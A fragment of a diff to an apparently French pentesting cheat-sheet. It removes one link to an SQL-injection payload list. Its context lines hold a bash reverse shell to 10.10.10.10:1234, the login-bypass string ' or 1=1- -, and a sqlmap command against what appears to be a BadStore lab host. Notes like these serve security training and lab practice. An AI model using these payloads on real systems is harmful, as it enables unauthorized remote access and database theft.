@@ -67,7 +67,6 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
 - All payloads for reverse shell --> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 
 - `' or 1=1- -` --> Bypass authentification web
-	- [Payload](https://github.com/payloadbox/sql-injection-payload-list)
 
 - SQLMap --> `sqlmap -u http://192.168.56.109/cgi-bin/badstore.cgi?action=loginregister --dbs --batch searchquery`
   	- Outil automatique SQLMap --> https://github.com/DedSecCyber/DedSecSQL
